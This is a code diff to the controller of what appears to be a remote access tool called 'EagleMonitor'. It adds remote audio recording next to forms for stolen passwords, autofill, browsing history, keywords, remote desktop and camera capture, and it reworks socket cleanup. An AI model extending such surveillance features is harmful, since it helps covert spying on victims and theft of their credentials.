@@ -1,4 +1,5 @@
 ﻿using EagleMonitor.Forms;
+using EagleMonitor.Utils;
 using PacketLib;
 using PacketLib.Packet;
 using PacketLib.Utils;
@@ -46,11 +47,13 @@ namespace EagleMonitor.Networking
         internal Socket socket { get; set; }
         internal string IP { get; set; }
         internal string HWID { get; set; }
+        internal string fullName { get; set; }
         internal DataGridViewRow clientRow { get; set; }
         internal int serverPort { get; set; }
         internal string clientPath { get; set; }
         internal string clientStatus { get; set; }
         internal bool is64bitClient { get; set; }
+        internal AudioHelpers audioHelper { get; set; }
 
 
         internal PasswordsForm passwordsForm { get; set; }
@@ -61,10 +64,11 @@ namespace EagleMonitor.Networking
         internal HistoryForm historyForm { get; set; }
         internal MiscellaneousForm miscellaneousForm { get; set; }
         internal RemoteDesktopForm remoteDesktopForm { get; set; }
-        internal RemoteCamera remoteCamera { get; set; }
+        internal RemoteCameraForm remoteCameraForm { get; set; }
         internal InformationForm informationForm { get; set; }
         internal AutofillForm autofillForm { get; set; }
-
+        internal KeywordsForm keywordsForm { get; set; }
+        internal RemoteAudioForm remoteAudioForm { get; set; }
         internal ClientHandler(Socket sock, int port) 
         {
             readDataAsync = new ReadDataAsync(ReceiveData);
@@ -146,7 +150,6 @@ namespace EagleMonitor.Networking
         {
             try
             {
-                int packetSize = 0;
                 return BufferPacket.DeserializePacket(Utils.Miscellaneous.settings.key);//, out packetSize);
             }
             catch (Exception)
@@ -184,9 +187,14 @@ namespace EagleMonitor.Networking
                             break;
 
                         case PacketType.RC_CAPTURE_ON:
-                            ClientHandler.ClientHandlersList[packet.baseIp].remoteCamera.clientHandler = this;
+                            ClientHandler.ClientHandlersList[packet.baseIp].remoteCameraForm.clientHandler = this;
                             new PacketHandler(packet, this);
                             //PacketHandler.packetParser.BeginInvoke(packet, this, new AsyncCallback(PacketHandler.Log), null);
+                            break;
+
+                        case PacketType.AUDIO_RECORD_ON:
+                            ClientHandler.ClientHandlersList[packet.baseIp].remoteAudioForm.clientHandler = this;
+                            new PacketHandler(packet, this);
                             break;
 
                         default:
@@ -288,26 +296,37 @@ namespace EagleMonitor.Networking
                         break;
                 }
 
-                packet = null;
+                if (packet.packetType == PacketType.RC_CAPTURE_OFF || packet.packetType == PacketType.AUDIO_RECORD_OFF || packet.packetType == PacketType.RM_VIEW_OFF)
+                {
+                    packet = null;
+                    this.Dispose();
+                }
             }));
-            /*if (length != 0)//TODO : LOGS
-                MessageBox.Show("Data sent ! + length = " + length.ToString());
-            else
-                MessageBox.Show("Error while sending data + length =" + length.ToString());*/
         }
 
         public void Dispose()
         {
-            if (socket != null)
+            /*if (socket != null)
             {
-                if(ClientHandlersList.ContainsKey(this.IP))
-                    ClientHandlersList.Remove(this.IP);
-
+                MessageBox.Show("??");
+                socket.Shutdown(SocketShutdown.Both);
+                MessageBox.Show("???");
+                socket.Close();
+                MessageBox.Show("????");
+                socket.Dispose();
+                socket = null;
+            }*/
+            try
+            {
                 socket.Shutdown(SocketShutdown.Both);
                 socket.Close();
                 socket.Dispose();
                 socket = null;
             }
+            catch { }
+
+            if (ClientHandlersList.ContainsKey(this.IP))
+                ClientHandlersList.Remove(this.IP);
 
             if (this.clientRow != null) 
             {
@@ -323,9 +342,10 @@ namespace EagleMonitor.Networking
                 Utils.Miscellaneous.CloseForm(memoryExecutionForm);
                 Utils.Miscellaneous.CloseForm(historyForm);
                 Utils.Miscellaneous.CloseForm(miscellaneousForm);
-                Utils.Miscellaneous.CloseForm(remoteCamera);
+                Utils.Miscellaneous.CloseForm(remoteCameraForm);
                 Utils.Miscellaneous.CloseForm(remoteDesktopForm);
                 Utils.Miscellaneous.CloseForm(informationForm);
+                Utils.Miscellaneous.CloseForm(remoteAudioForm);
             }
         }
     }
